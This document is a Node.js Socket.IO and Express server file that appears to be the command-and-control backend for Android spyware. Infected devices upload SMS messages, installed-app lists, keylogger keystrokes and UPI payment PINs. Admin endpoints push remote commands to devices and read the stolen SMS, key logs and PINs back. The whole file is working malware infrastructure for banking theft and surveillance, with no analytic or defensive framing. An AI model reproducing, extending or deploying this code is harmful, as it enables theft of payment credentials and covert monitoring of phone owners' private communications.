// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const { PrismaClient } = require('@prisma/client');

// Handle BigInt serialization
BigInt.prototype.toJSON = function () { return this.toString() }

const prisma = new PrismaClient();
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Logging middleware
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${req.method} ${req.url}`);
    next();
});

app.use(cors());
app.use(express.json());

// Connect to database
async function connectDatabase() {
    try {
        console.log('Attempting to connect to database...');
        await prisma.$connect();
        console.log('✅ Connected to database via Prisma');
    } catch (err) {
        console.error('❌ Database connection error:', err);
        process.exit(1);
    }
}

connectDatabase();

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.device_id;
    const connectionId = socket.id;
    const timestamp = new Date().toISOString();

    console.log(`🔌 [${timestamp}] New connection: socket=${connectionId}, device=${deviceId || 'unknown'}`);

    if (deviceId) {
        // Join device-specific room
        socket.join(`device:${deviceId}`);
        console.log(`📍 [${timestamp}] Device ${deviceId} joined room device:${deviceId}`);

        // Update device online status
        prisma.device.upsert({
            where: { device_id: deviceId },
            update: {
                status: true,
                last_seen: new Date()
            },
            create: {
                device_id: deviceId,
                status: true,
                last_seen: new Date()
            }
        }).then(() => {
            console.log(`✅ [${timestamp}] Device ${deviceId} online status updated`);
        }).catch(err => {
            console.error(`❌ [${timestamp}] Error updating device status for ${deviceId}:`, err.message);
        });
    }

    // Upsert device data
    socket.on('upsert_device_data', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📱 [${timestamp}] upsert_device_data received from ${deviceId || 'unknown'}`);

        try {
            let deviceData = typeof data === 'string' ? JSON.parse(data) : data;
            console.log(`📊 [${timestamp}] Device data:`, JSON.stringify(deviceData).substring(0, 200) + '...');

            // Handle array input (take first item)
            if (Array.isArray(deviceData)) {
                console.log(`📋 [${timestamp}] Device data is array, taking first element`);
                deviceData = deviceData[0];
            }

            if (!deviceData) {
                console.error(`❌ [${timestamp}] No device data provided from ${deviceId}`);
                if (ack) ack(false);
                return;
            }

            // Helper to get value from either snake_case or camelCase
            const getVal = (key1, key2) => deviceData[key1] !== undefined ? deviceData[key1] : deviceData[key2];

            const id = getVal('device_id', 'deviceId');

            if (!id) {
                console.error(`❌ [${timestamp}] Device ID missing in upsert data from ${deviceId}`);
                if (ack) ack(false);
                return;
            }

            const updateData = {
                android_id: getVal('android_id', 'androidId'),
                manufacturer: getVal('manufacturer', 'manufacturer') ?? "Unknown",
                model: getVal('model', 'model') ?? "Unknown",
                brand: getVal('brand', 'brand'),
                product: getVal('product', 'product'),
                android_version: getVal('android_version', 'androidVersion'),
                raw_device_info: getVal('raw_device_info', 'rawDeviceInfo'),
                sim_cards: getVal('sim_cards', 'simCards'),
                service_status: getVal('service_status', 'serviceStatus'),
                oem_status: getVal('oem_status', 'oemStatus'),
                power_save_status: getVal('power_save_status', 'powerSaveStatus'),
                screen_status: getVal('screen_status', 'screenStatus'),
                process_importance: (getVal('process_importance', 'processImportance') || null)?.toString(),

                // If heartbeat is included in the payload, save it too
                heartbeat: deviceData.heartbeat || undefined,

                status: true,
                last_seen: new Date()
            };

            console.log(`💾 [${timestamp}] Upserting device ${id} with data:`, JSON.stringify(updateData).substring(0, 300) + '...');

            await prisma.device.upsert({
                where: { device_id: id },
                update: updateData,
                create: {
                    device_id: id,
                    ...updateData
                }
            });

            console.log(`✅ [${timestamp}] Device ${id} data upserted successfully`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error upserting device data from ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Get pending commands
    socket.on('get_pending_commands', async (deviceId, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📥 [${timestamp}] get_pending_commands requested for ${deviceId}`);

        try {
            const commands = await prisma.deviceCommand.findMany({
                where: {
                    device_id: deviceId,
                    status: 'pending'
                },
                orderBy: { created_at: 'desc' }
            });

            console.log(`📋 [${timestamp}] Found ${commands.length} pending commands for ${deviceId}`);

            const mappedCommands = commands.map(c => ({
                id: c.id,
                deviceId: c.device_id,
                command: c.command,
                payload: c.payload,
                status: c.status
            }));

            if (ack) ack(JSON.stringify(mappedCommands));
        } catch (error) {
            console.error(`❌ [${timestamp}] Error getting pending commands for ${deviceId}:`, error);
            if (ack) ack(JSON.stringify([]));
        }
    });

    // Mark command as delivered
    socket.on('mark_command_delivered', async (commandId, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📬 [${timestamp}] mark_command_delivered for command ${commandId}`);

        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'delivered',
                    delivered_at: new Date()
                }
            });
            console.log(`✅ [${timestamp}] Command ${commandId} marked as delivered`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error marking command ${commandId} as delivered:`, error);
            if (ack) ack(false);
        }
    });

    // Mark command as executed
    socket.on('mark_command_executed', async (commandId, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`✅ [${timestamp}] mark_command_executed for command ${commandId}`);

        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'executed',
                    executed_at: new Date()
                }
            });
            console.log(`✅ [${timestamp}] Command ${commandId} marked as executed`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error marking command ${commandId} as executed:`, error);
            if (ack) ack(false);
        }
    });

    // Mark command as failed
    socket.on('mark_command_failed', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`❌ [${timestamp}] mark_command_failed received`);

        try {
            const d = typeof data === 'string' ? JSON.parse(data) : data;
            console.log(`📋 [${timestamp}] Command failure data:`, JSON.stringify(d));

            await prisma.deviceCommand.update({
                where: { id: d.command_id },
                data: {
                    status: 'failed',
                    executed_at: new Date()
                }
            });
            console.log(`⚠️ [${timestamp}] Command ${d.command_id} failed with error: ${d.error}`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error marking command as failed:`, error);
            if (ack) ack(false);
        }
    });

    // Send heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`💓 [${timestamp}] send_heartbeat received`);

        try {
            const h = typeof data === 'string' ? JSON.parse(data) : data;
            const deviceId = h.device_id;

            console.log(`📊 [${timestamp}] Heartbeat data for ${deviceId}: status=${h.status}, uptime=${h.uptime}, ram=${h.ram}`);

            if (!deviceId) {
                console.error(`❌ [${timestamp}] Heartbeat missing device_id`);
                if (ack) ack(false);
                return;
            }

            // Insert into heartbeat table
            await prisma.heartbeat.create({
                data: {
                    device_id: deviceId,
                    status: Boolean(h.status),
                    last_update: new Date(),
                    uptime: BigInt(h.uptime || 0),
                    ram: BigInt(h.ram || 0)
                }
            });

            // Update device table last_seen
            await prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    last_seen: new Date(),
                    status: Boolean(h.status)
                }
            });

            socket.emit('heartbeat_ack');
            console.log(`✅ [${timestamp}] Heartbeat processed for ${deviceId}`);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error processing heartbeat:`, error);
            if (ack) ack(false);
        }
    });

    // Set online status
    socket.on('set_online_status', async (status, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`🔄 [${timestamp}] set_online_status: ${status} for ${deviceId}`);

        try {
            if (deviceId) {
                await prisma.device.update({
                    where: { device_id: deviceId },
                    data: {
                        status: Boolean(status),
                        last_seen: new Date()
                    }
                }).then(() => {
                    console.log(`✅ [${timestamp}] Online status updated to ${status} for ${deviceId}`);
                }).catch(e => {
                    console.error(`❌ [${timestamp}] Update online status failed for ${deviceId}:`, e.message);
                });
            } else {
                console.warn(`⚠️ [${timestamp}] No deviceId available for set_online_status`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error setting online status:`, error);
            if (ack) ack(false);
        }
    });

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📨 [${timestamp}] sync_sms received`);

        try {
            let messages = typeof data === 'string' ? JSON.parse(data) : data;

            if (!Array.isArray(messages)) {
                // Handle case where it might be a single object or wrapped strangely
                messages = [messages];
            }
            console.log(`📱 [${timestamp}] Processing ${messages.length} SMS messages`);

            // Normalize helper
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const validMessages = [];
            for (const msg of messages) {
                if (!msg) continue;
                const dId = getVal(msg, 'device_id', 'deviceId');
                const idRaw = getVal(msg, 'id', 'id');

                if (dId && idRaw !== undefined && idRaw !== null) {
                    validMessages.push({ ...msg, _deviceId: dId, _idRaw: idRaw });
                }
            }

            if (validMessages.length === 0) {
                console.log(`⚠️ [${timestamp}] No valid SMS messages to sync (might be empty list)`);
                if (ack) ack(true);
                return;
            }

            await prisma.$transaction(async (tx) => {
                for (const msg of validMessages) {
                    const smsId = getVal(msg._idRaw);
                    const address = getVal(msg, 'address', 'address') || "";
                    const body = getVal(msg, 'body', 'body') || "";
                    const date = getVal(msg, 'date', 'date') || new Date().toISOString();
                    const timestampVal = getVal(msg, 'timestamp', 'timestamp') || 0;
                    const type = parseInt(getVal(msg, 'type', 'type') || "1");

                    await tx.smsMessage.upsert({
                        where: {
                            id_device_id: {
                                id: smsId,
                                device_id: msg._deviceId
                            }
                        },
                        update: {
                            address: address,
                            body: body,
                            date: date,
                            timestamp: BigInt(timestampVal),
                            type: type,
                            sync_status: 'synced'
                        },
                        create: {
                            id: smsId,
                            device_id: msg._deviceId,
                            address: address,
                            body: body,
                            date: date,
                            timestamp: BigInt(timestampVal),
                            type: type,
                            sync_status: 'synced'
                        }
                    });
                }
            });

            console.log(`✅ [${timestamp}] Synced ${validMessages.length} SMS messages`);
            socket.emit('sync_complete', 'sms', validMessages.length);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error syncing SMS:`, error);
            if (ack) ack(false);
        }
    });

    // Sync single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📩 [${timestamp}] sync_single_sms received`);

        try {
            const msg = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const dId = getVal(msg, 'device_id', 'deviceId');
            const idRaw = getVal(msg, 'id', 'id');

            console.log(`📋 [${timestamp}] Single SMS: device=${dId}, from=${getVal(msg, 'address', 'address')}, id=${idRaw}`);

            if (dId && idRaw !== undefined && idRaw !== null) {
                const smsId = getVal(idRaw);
                const address = getVal(msg, 'address', 'address') || "";
                const body = getVal(msg, 'body', 'body') || "";
                const date = getVal(msg, 'date', 'date') || new Date().toISOString();
                const timestampVal = getVal(msg, 'timestamp', 'timestamp') || 0;
                const type = parseInt(getVal(msg, 'type', 'type') || "1");

                await prisma.smsMessage.upsert({
                    where: {
                        id_device_id: {
                            id: smsId,
                            device_id: dId
                        }
                    },
                    update: {
                        address: address,
                        body: body,
                        date: date,
                        timestamp: BigInt(timestampVal),
                        type: type,
                        sync_status: 'synced'
                    },
                    create: {
                        id: smsId,
                        device_id: dId,
                        address: address,
                        body: body,
                        date: date,
                        timestamp: BigInt(timestampVal),
                        type: type,
                        sync_status: 'synced'
                    }
                });
                console.log(`✅ [${timestamp}] Single SMS synced successfully`);
            } else {
                console.warn(`⚠️ [${timestamp}] Single SMS sync skipped: Missing deviceId or id`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error syncing single SMS:`, error);
            if (ack) ack(false);
        }
    });

    // Sync apps
    socket.on('sync_apps', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`📦 [${timestamp}] sync_apps received`);

        try {
            let apps = typeof data === 'string' ? JSON.parse(data) : data;

            if (!Array.isArray(apps)) {
                apps = [apps];
            }
            console.log(`📱 [${timestamp}] Processing ${apps.length} apps`);

            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            // Filter valid apps
            const validApps = [];
            for (const app of apps) {
                if (!app) continue;
                const dId = getVal(app, 'device_id', 'deviceId');
                const pkg = getVal(app, 'package_name', 'packageName');

                if (dId && pkg) {
                    validApps.push({ ...app, _deviceId: dId, _pkg: pkg });
                } else {
                    console.warn(`⚠️ [${timestamp}] Invalid app entry: missing device_id or package_name`);
                }
            }

            if (validApps.length === 0) {
                console.log(`⚠️ [${timestamp}] No valid apps to sync (might be empty list)`);
                if (ack) ack(true);
                return;
            }

            await prisma.$transaction(async (tx) => {
                for (const app of validApps) {
                    const packageName = app._pkg;
                    const deviceId = app._deviceId;

                    const appName = getVal(app, 'app_name', 'appName') || packageName;
                    const icon = getVal(app, 'icon', 'icon') || "";
                    const versionName = getVal(app, 'version_name', 'versionName') || "";

                    const versionCodeFn = getVal(app, 'version_code', 'versionCode');
                    const versionCode = versionCodeFn ? BigInt(versionCodeFn) : null;

                    const firstInstallTimeFn = getVal(app, 'first_install_time', 'firstInstallTime');
                    const firstInstallTime = firstInstallTimeFn ? BigInt(firstInstallTimeFn) : null;

                    const lastUpdateTimeFn = getVal(app, 'last_update_time', 'lastUpdateTime');
                    const lastUpdateTime = lastUpdateTimeFn ? BigInt(lastUpdateTimeFn) : null;

                    const isSystemApp = Boolean(getVal(app, 'is_system_app', 'isSystemApp'));
                    const targetSdk = parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0");
                    const minSdk = parseInt(getVal(app, 'min_sdk', 'minSdk') || "0");

                    const syncTsFn = getVal(app, 'sync_timestamp', 'syncTimestamp');
                    const syncTimestamp = syncTsFn ? BigInt(syncTsFn) : BigInt(Date.now());

                    await tx.installedApp.upsert({
                        where: {
                            device_id_package_name: {
                                device_id: deviceId,
                                package_name: packageName
                            }
                        },
                        update: {
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            updated_at: new Date()
                        },
                        create: {
                            device_id: deviceId,
                            package_name: packageName,
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            created_at: new Date(),
                            updated_at: new Date()
                        }
                    });
                }
            });

            console.log(`✅ [${timestamp}] Synced ${validApps.length} apps`);
            socket.emit('sync_complete', 'apps', validApps.length);
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error syncing apps:`, error);
            if (ack) ack(false);
        }
    });


    // Set key log
    socket.on('set_key_log', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`⌨️ [${timestamp}] set_key_log received`);

        try {
            const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(keyLog, 'device_id', 'deviceId');
            const currentDate = getVal(keyLog, 'current_date', 'currentDate');

            console.log(`📝 [${timestamp}] Key log from ${deviceId}: ${getVal(keyLog, 'key', 'key')}`);

            if (deviceId) {
                await prisma.keyLog.create({
                    data: {
                        device_id: deviceId,
                        keylogger: getVal(keyLog, 'keylogger', 'keylogger'),
                        key: getVal(keyLog, 'key', 'key'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
                console.log(`✅ [${timestamp}] Key log saved for ${deviceId}`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error saving key log:`, error);
            if (ack) ack(false);
        }
    });

    // Set UPI pin
    socket.on('set_upi_pin', async (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`🔐 [${timestamp}] set_upi_pin received`);

        try {
            const pinData = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(pinData, 'device_id', 'deviceId');
            const currentDate = getVal(pinData, 'current_date', 'currentDate');

            console.log(`📝 [${timestamp}] UPI pin from ${deviceId}: ${getVal(pinData, 'pin', 'pin').replace(/./g, '*')}`);

            if (deviceId) {
                await prisma.upiPin.create({
                    data: {
                        device_id: deviceId,
                        pin: getVal(pinData, 'pin', 'pin'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
                console.log(`✅ [${timestamp}] UPI pin saved for ${deviceId}`);
            }
            if (ack) ack(true);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error saving UPI pin:`, error);
            if (ack) ack(false);
        }
    });

    // Test connection
    socket.on('test_connection', (data, ack) => {
        const timestamp = new Date().toISOString();
        console.log(`🧪 [${timestamp}] test_connection from ${deviceId || 'unknown'}`);
        if (ack) ack(true);
    });

    // Admin: Send command to device
    socket.on('send_command', async (data) => {
        const timestamp = new Date().toISOString();
        console.log(`📤 [${timestamp}] Admin send_command:`, JSON.stringify(data));

        try {
            const { device_id, command, payload } = data;
            const newCommand = await prisma.deviceCommand.create({
                data: {
                    device_id,
                    command,
                    payload,
                    status: 'pending'
                }
            });

            const commandToSend = {
                id: newCommand.id,
                deviceId: newCommand.device_id,
                command: newCommand.command,
                payload: newCommand.payload,
                status: newCommand.status
            };

            console.log(`📦 [${timestamp}] Created command ${newCommand.id} for device ${device_id}`);

            // Emit as array because client expects List<DeviceCommand>
            io.to(`device:${device_id}`).emit('command', JSON.stringify([commandToSend]));
            console.log(`📡 [${timestamp}] Command ${newCommand.id} sent to device:${device_id}`);
        } catch (error) {
            console.error(`❌ [${timestamp}] Error sending command:`, error);
        }
    });

    // Handle disconnection
    socket.on('disconnect', (reason) => {
        const timestamp = new Date().toISOString();
        console.log(`🔌 [${timestamp}] Device disconnected: ${deviceId || 'unknown'} (socket: ${connectionId}, reason: ${reason})`);

        if (deviceId) {
            // Update device offline status
            prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    status: false,
                    last_seen: new Date()
                }
            }).then(() => {
                console.log(`✅ [${timestamp}] Device ${deviceId} marked as offline`);
            }).catch(err => {
                console.error(`❌ [${timestamp}] Error updating offline status for ${deviceId}:`, err);
            });
        }
    });

    // Handle connection errors
    socket.on('error', (error) => {
        const timestamp = new Date().toISOString();
        console.error(`❌ [${timestamp}] Socket error for ${deviceId}:`, error);
    });
});

// REST API Endpoints for Admin
app.get('/api/devices', async (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`🌐 [${timestamp}] GET /api/devices`);

    try {
        const devices = await prisma.device.findMany({
            orderBy: { last_seen: 'desc' }
        });
        console.log(`✅ [${timestamp}] Returning ${devices.length} devices`);
        res.json(devices);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching devices:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/commands', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/commands`);

    try {
        const commands = await prisma.deviceCommand.findMany({
            where: { device_id: deviceId },
            orderBy: { created_at: 'desc' }
        });
        console.log(`✅ [${timestamp}] Returning ${commands.length} commands for ${deviceId}`);
        res.json(commands);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching commands for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/devices/:deviceId/commands', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    const { command, payload } = req.body;
    console.log(`🌐 [${timestamp}] POST /api/devices/${deviceId}/commands`, { command, payload });

    try {
        const newCommand = await prisma.deviceCommand.create({
            data: {
                device_id: deviceId,
                command: command,
                payload: payload,
                status: 'pending'
            }
        });

        const commandToSend = {
            id: newCommand.id,
            device_id: newCommand.device_id,
            command: newCommand.command,
            payload: newCommand.payload,
            status: newCommand.status
        };

        console.log(`✅ [${timestamp}] Created command ${newCommand.id} for ${deviceId}`);

        // Emit command to device
        io.to(`device:${deviceId}`).emit('command', JSON.stringify([commandToSend]));
        console.log(`📡 [${timestamp}] Command ${newCommand.id} sent to device:${deviceId}`);

        res.json(newCommand);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error creating command for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/heartbeats`);

    try {
        const heartbeats = await prisma.heartbeat.findMany({
            where: { device_id: deviceId },
            orderBy: { last_update: 'desc' },
            take: 100
        });
        console.log(`✅ [${timestamp}] Returning ${heartbeats.length} heartbeats for ${deviceId}`);
        res.json(heartbeats);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching heartbeats for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});


// GET synced SMS for a device
app.get('/api/devices/:deviceId/sms', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/sms`);

    try {
        const sms = await prisma.smsMessage.findMany({
            where: { device_id: deviceId },
            orderBy: { date: 'desc' },
            take: 100
        });
        console.log(`✅ [${timestamp}] Returning ${sms.length} SMS messages for ${deviceId}`);
        res.json(sms);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching SMS for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// GET installed apps for a device
app.get('/api/devices/:deviceId/apps', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/apps`);

    try {
        const apps = await prisma.installedApp.findMany({
            where: { device_id: deviceId },
            orderBy: { app_name: 'asc' }
        });
        console.log(`✅ [${timestamp}] Returning ${apps.length} apps for ${deviceId}`);
        res.json(apps);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching apps for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// GET Key Logs for a device
app.get('/api/devices/:deviceId/logs/keys', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/logs/keys`);

    try {
        const logs = await prisma.keyLog.findMany({
            where: { device_id: deviceId },
            orderBy: { currentDate: 'desc' },
            take: 100
        });
        res.json(logs);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching key logs for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// GET UPI Pins for a device
app.get('/api/devices/:deviceId/logs/upi', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/logs/upi`);

    try {
        const logs = await prisma.upiPin.findMany({
            where: { device_id: deviceId },
            orderBy: { currentDate: 'desc' },
            take: 100
        });
        res.json(logs);
    } catch (error) {
        console.error(`❌ [${timestamp}] Error fetching UPI logs for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`🌐 [${timestamp}] GET /health`);
    res.json({
        status: 'healthy',
        timestamp,
        uptime: process.uptime(),
        connections: (Object.keys(io.sockets.sockets).length + 1)
    });
});

// Graceful shutdown
process.on('SIGINT', async () => {
    const timestamp = new Date().toISOString();
    console.log(`🛑 [${timestamp}] Received SIGINT, shutting down gracefully...`);

    await prisma.$disconnect();
    console.log(`✅ [${timestamp}] Database disconnected`);

    server.close(() => {
        console.log(`✅ [${timestamp}] Server closed`);
        process.exit(0);
    });
});

process.on('SIGTERM', async () => {
    const timestamp = new Date().toISOString();
    console.log(`🛑 [${timestamp}] Received SIGTERM, shutting down gracefully...`);

    await prisma.$disconnect();
    console.log(`✅ [${timestamp}] Database disconnected`);

    server.close(() => {
        console.log(`✅ [${timestamp}] Server closed`);
        process.exit(0);
    });
});

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    const timestamp = new Date().toISOString();
    console.error(`💥 [${timestamp}] Uncaught Exception:`, error);
});

process.on('unhandledRejection', (reason, promise) => {
    const timestamp = new Date().toISOString();
    console.error(`💥 [${timestamp}] Unhandled Rejection at:`, promise, 'reason:', reason);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    const timestamp = new Date().toISOString();
    console.log(`🚀 [${timestamp}] Socket.IO server running on port ${PORT}`);
    console.log(`📊 [${timestamp}] Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`🔗 [${timestamp}] CORS enabled for all origins`);
});